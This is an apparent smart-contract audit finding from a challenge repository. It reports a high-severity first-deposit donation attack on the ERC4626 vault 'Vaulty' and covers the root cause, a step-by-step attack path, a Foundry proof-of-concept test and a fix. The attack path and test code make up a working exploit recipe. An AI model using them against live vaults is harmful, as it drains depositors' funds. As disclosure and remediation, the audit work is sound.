# SWUM-001: [High] First-deposit donation can make victim deposits mint zero shares

## [High] First-deposit donation can make victim deposits mint zero shares

### Summary

`Vaulty.deposit` handles the first deposit with a custom `shares = assets` branch, then uses inherited ERC4626 `previewDeposit` for later deposits. Because inherited `totalAssets()` is the raw underlying balance of the vault, an attacker can first mint one share, transfer underlying directly to the vault, and force a later positive victim deposit to mint `0` shares while still transferring the victim's assets into the vault.

In this repository's local asset model, the donation capital is reachable at no cost because `VToken.mint(address,uint256)` is unrestricted. The attacker can therefore convert a free direct donation into a claim over victim-deposited assets.

### Impact

A victim can lose a positive deposit and receive zero vault shares. The attacker can then redeem their single share for a portion of the vault's assets, including value supplied by the victim. This is a direct user-fund loss in the local challenge scope where `VToken` represents the vault asset.

Severity is High because the path is permissionless and causes direct loss to later depositors, although the exact profit depends on the local unrestricted `VToken.mint` behavior. With a non-mintable production asset, the same zero-share victim loss remains reachable, but one-victim profitability must account for the attacker's donation cost and OpenZeppelin's virtual-share capture.

### Root Cause

`Vaulty.deposit` bypasses the inherited ERC4626 conversion logic for the first deposit and does not reject zero-share outcomes for later deposits. The vault also relies on inherited `totalAssets()`, which counts unsolicited direct token transfers as vault assets.

Relevant code:

```solidity
if (totalSupply() == 0){
    shares = assets;
}else {
     shares = previewDeposit(assets);
}

SafeERC20.safeTransferFrom(IERC20(asset()), msg.sender, address(this), assets);
_mint(receiver, shares);
```

Inherited ERC4626 conversion:

```solidity
function totalAssets() public view virtual returns (uint256) {
    return IERC20(asset()).balanceOf(address(this));
}

function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
    return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
}
```

### Preconditions

- The vault is empty.
- The attacker can acquire or mint underlying `VToken`. In this repository, `VToken.mint` is external and unrestricted.
- A victim subsequently deposits after the attacker's first deposit and direct donation.

### Attack Path

1. Attacker calls `VToken.mint(attacker, D + 1)`.
2. Attacker approves Vaulty and calls `Vaulty.deposit(1, attacker)`.
3. Because `totalSupply() == 0`, Vaulty mints exactly `1` share to the attacker.
4. Attacker transfers `D` `VToken` directly to `address(vaulty)` without calling `deposit`.
5. Victim approves Vaulty and calls `Vaulty.deposit(A, victim)`.
6. Vaulty computes victim shares as `floor(A * (totalSupply + 1) / (totalAssets + 1))`.
7. With `totalSupply = 1` and `totalAssets = D + 1`, victim shares are `floor(2A / (D + 2))`.
8. If `D >= 2A - 1`, the victim receives `0` shares while `safeTransferFrom` still transfers `A` assets into the vault.
9. Attacker redeems or withdraws against their single share and captures value from the victim's deposit.

Concrete example using Agent 3's suggested values:

- `A = 100e18`
- `D = 201e18`
- Victim shares: `floor(2 * 100e18 / (201e18 + 2)) = 0`
- Victim transfers `100e18` assets and receives no shares.

### Proof of Concept / Reproduction Plan

The existing test path in `test/Vault.t.sol:testFirstDeposit` already performs the key sequence: Bob deposits first, Bob directly transfers tokens to the vault, then Alice deposits. To make the test assert the exploit, add checks equivalent to:

```solidity
function testZeroShareDonationAttack() public {
    uint256 victimDeposit = 100e18;
    uint256 donation = 201e18;

    vToken.mint(bob, donation + 1);

    vm.startPrank(bob);
    vToken.approve(address(vaulty), 1);
    vaulty.deposit(1, bob);
    vToken.transfer(address(vaulty), donation);
    vm.stopPrank();

    uint256 aliceBefore = vToken.balanceOf(alice);

    vm.startPrank(alice);
    vToken.approve(address(vaulty), victimDeposit);
    uint256 shares = vaulty.deposit(victimDeposit, alice);
    vm.stopPrank();

    assertEq(shares, 0);
    assertEq(vaulty.balanceOf(alice), 0);
    assertEq(vToken.balanceOf(alice), aliceBefore - victimDeposit);
}
```

Local verification performed by Agent 4: `forge test --match-path test/Vault.t.sol -vvv` passes, confirming the repository's first-deposit/direct-transfer/deposit path is executable.

### Why Existing Checks Do Not Prevent It

- `require(assets > 0)` only rejects zero-asset deposits; it does not reject zero-share deposits.
- `maxDepositLimit` limits the victim's per-call deposit amount but does not prevent prior direct donations.
- `nonReentrant` does not prevent a donation in an earlier transaction.
- OpenZeppelin's virtual assets/shares are weakened because Vaulty special-cases the first deposit instead of consistently using ERC4626 conversion and because the vault allows minting `0` shares.
- No slippage/min-share parameter lets the depositor protect themselves.

### Recommended Fix

Use a consistent ERC4626 implementation and reject zero-share deposits. Also consider internal asset accounting if direct donations should not affect share pricing.

Minimal patch:

```diff
 function deposit(uint256 assets, address receiver)
     public
     virtual
     override
     nonReentrant
     returns (uint256)
 {
     require(assets > 0, "Cannot deposit zero");
     require(assets <= maxDepositLimit, "Exceeds max deposit limit");

-    uint256 shares;
-
-    if (totalSupply() == 0){
-        shares = assets;
-    }else {
-         shares = previewDeposit(assets);
-    }
+    uint256 shares = previewDeposit(assets);
+    require(shares > 0, "Zero shares");

     SafeERC20.safeTransferFrom(IERC20(asset()), msg.sender, address(this), assets);
     _mint(receiver, shares);
```

For stronger protection, add a user-supplied `minSharesOut` deposit path or use internal accounting that excludes unsolicited token transfers from pricing.

### Affected Code

- `src/Vaulty.sol:50-76` (`deposit`)
- `src/Vaulty.sol:62-66` (first-deposit branch)
- `src/Vaulty.sol:69-71` (asset transfer followed by mint)
- `lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol:116-118` (`totalAssets` raw balance)
- `lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol:225-227` (`_convertToShares`)
- `src/VToken.sol:15-18` (unrestricted mint in local asset model)
